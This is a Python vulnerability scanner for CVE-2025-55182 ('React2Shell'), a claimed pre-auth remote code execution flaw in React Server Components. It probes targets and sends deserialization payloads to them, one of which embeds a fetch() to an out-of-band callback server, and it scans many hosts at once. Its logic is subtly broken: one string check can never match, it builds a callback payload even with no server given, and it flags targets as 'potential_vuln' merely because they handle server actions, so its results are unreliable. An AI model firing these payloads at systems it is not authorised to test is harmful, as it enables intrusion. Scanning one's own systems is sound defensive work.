#!/usr/bin/env python3
"""
CVE-2025-55182 (React2Shell) Vulnerability Scanner
Pre-auth RCE in React Server Components

Affected:
- React 19.0.0, 19.1.0, 19.1.1, 19.2.0
- Next.js 15.x/16.x with App Router
- react-server-dom-webpack, react-server-dom-parcel, react-server-dom-turbopack

IOCs (from AWS threat intel):
- POST requests with 'next-action' or 'rsc-action-id' headers
- Request bodies containing '$@' patterns
- Request bodies containing '"status":"resolved_model"' patterns
"""

import asyncio
import aiohttp
import json
import sys
import secrets
from typing import Optional
from datetime import datetime


class React2ShellScanner:
    """Scanner for CVE-2025-55182 React2Shell vulnerability"""
    
    def __init__(self, oast_server: Optional[str] = None, timeout: int = 10):
        self.oast_server = oast_server
        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.results = []
        
    async def check_rsc_enabled(self, session: aiohttp.ClientSession, url: str) -> dict:
        """Check if target responds to RSC action headers"""
        result = {
            "url": url,
            "rsc_enabled": False,
            "action_response": None,
            "server_header": None,
            "potential_vuln": False,
            "error": None,
            "timestamp": datetime.utcnow().isoformat()
        }
        
        # Generate random action ID
        action_id = secrets.token_hex(20)
        
        headers = {
            "Content-Type": "text/x-component",
            "next-action": action_id,
            "Accept": "text/x-component",
            "User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)"
        }
        
        try:
            async with session.post(url, headers=headers, data="0:test", ssl=False) as resp:
                result["status_code"] = resp.status
                result["server_header"] = resp.headers.get("server", "unknown")
                
                body = await resp.text()
                result["response_snippet"] = body[:200]
                
                # Check for RSC action handling
                if "Server action not found" in body:
                    result["rsc_enabled"] = True
                    result["action_response"] = "server_action_not_found"
                    result["potential_vuln"] = True
                elif "Invalid action" in body.lower():
                    result["rsc_enabled"] = True
                    result["action_response"] = "invalid_action"
                    result["potential_vuln"] = True
                elif resp.status == 404 and "action" in body.lower():
                    result["rsc_enabled"] = True
                    result["action_response"] = "action_404"
                    result["potential_vuln"] = True
                elif "text/x-component" in resp.headers.get("content-type", ""):
                    result["rsc_enabled"] = True
                    result["action_response"] = "rsc_content_type"
                    result["potential_vuln"] = True
                    
        except asyncio.TimeoutError:
            result["error"] = "timeout"
        except aiohttp.ClientError as e:
            result["error"] = str(e)
        except Exception as e:
            result["error"] = f"unexpected: {e}"
            
        return result
    
    async def test_deserialization(self, session: aiohttp.ClientSession, url: str) -> dict:
        """Test deserialization payloads (CVE-2025-55182 specific patterns)"""
        result = {
            "url": url,
            "payloads_tested": [],
            "callback_sent": False,
            "oast_endpoint": None,
            "error": None
        }
        
        # IOC patterns from AWS threat intel
        payloads = [
            # Pattern 1: $@ reference pattern
            {
                "name": "dollar_at_pattern",
                "data": '1:$@1'
            },
            # Pattern 2: resolved_model status
            {
                "name": "resolved_model",
                "data": '{"status":"resolved_model","value":{"$$typeof":"@1"}}'
            },
            # Pattern 3: Thenable with callback
            {
                "name": "thenable_callback",
                "data": f'0:{{"status":"fulfilled","value":{{"$$typeof":"@1","then":"fetch(\\"{self.oast_server}/react2shell-{secrets.token_hex(4)}\\")"}}}}'
            },
        ]
        
        if self.oast_server:
            result["oast_endpoint"] = f"{self.oast_server}/react2shell"
        
        for payload in payloads:
            try:
                headers = {
                    "Content-Type": "text/x-component",
                    "next-action": secrets.token_hex(20),
                    "Accept": "text/x-component",
                }
                
                async with session.post(url, headers=headers, data=payload["data"], ssl=False) as resp:
                    body = await resp.text()
                    result["payloads_tested"].append({
                        "name": payload["name"],
                        "status": resp.status,
                        "response_length": len(body)
                    })
                    
            except Exception as e:
                result["payloads_tested"].append({
                    "name": payload["name"],
                    "error": str(e)
                })
                
        return result
    
    async def scan_target(self, url: str) -> dict:
        """Full scan of a single target"""
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=self.timeout, connector=connector) as session:
            # Phase 1: Check if RSC is enabled
            rsc_check = await self.check_rsc_enabled(session, url)
            
            result = {
                "url": url,
                "rsc_check": rsc_check,
                "deserialization_test": None
            }
            
            # Phase 2: If RSC enabled, test deserialization payloads
            if rsc_check.get("potential_vuln"):
                result["deserialization_test"] = await self.test_deserialization(session, url)
                
            return result
    
    async def scan_targets(self, targets: list) -> list:
        """Scan multiple targets concurrently"""
        tasks = [self.scan_target(url) for url in targets]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        processed = []
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                processed.append({
                    "url": targets[i],
                    "error": str(result)
                })
            else:
                processed.append(result)
                
        self.results = processed
        return processed
    
    def print_results(self):
        """Print scan results summary"""
        print("\n" + "="*60)
        print("CVE-2025-55182 (React2Shell) Scan Results")
        print("="*60)
        
        vulnerable = []
        rsc_enabled = []
        
        for result in self.results:
            url = result.get("url", "unknown")
            rsc = result.get("rsc_check", {})
            
            if rsc.get("potential_vuln"):
                rsc_enabled.append(result)
                print(f"\n[+] {url}")
                print(f"    RSC Enabled: {rsc.get('action_response')}")
                print(f"    Server: {rsc.get('server_header')}")
                
                if result.get("deserialization_test"):
                    deser = result["deserialization_test"]
                    print(f"    Payloads Tested: {len(deser.get('payloads_tested', []))}")
                    if deser.get("oast_endpoint"):
                        print(f"    OAST Callback: {deser['oast_endpoint']}")
            elif result.get("error"):
                print(f"\n[-] {url}: {result['error']}")
            else:
                print(f"\n[-] {url}: No RSC action handling detected")
        
        print("\n" + "="*60)
        print(f"Summary: {len(rsc_enabled)}/{len(self.results)} targets with RSC enabled")
        print("="*60)
        
        if self.oast_server:
            print(f"\n[!] Check OAST server for callbacks: {self.oast_server}")


async def main():
    if len(sys.argv) < 2:
        print("Usage: python react2shell_scanner.py <target_or_file> [oast_server]")
        print("\nExamples:")
        print("  python react2shell_scanner.py http://target.com:3000")
        print("  python react2shell_scanner.py targets.json https://oast.pro/callback")
        sys.exit(1)
    
    target_arg = sys.argv[1]
    oast_server = sys.argv[2] if len(sys.argv) > 2 else None
    
    # Load targets
    targets = []
    if target_arg.endswith(".json"):
        with open(target_arg) as f:
            data = json.load(f)
            if isinstance(data, list):
                targets = [t.get("url", t) if isinstance(t, dict) else t for t in data]
            else:
                targets = [target_arg]
    else:
        targets = [target_arg]
    
    print(f"CVE-2025-55182 (React2Shell) Scanner")
    print(f"Targets: {len(targets)}")
    if oast_server:
        print(f"OAST Server: {oast_server}")
    print()
    
    scanner = React2ShellScanner(oast_server=oast_server)
    await scanner.scan_targets(targets)
    scanner.print_results()


if __name__ == "__main__":
    asyncio.run(main())
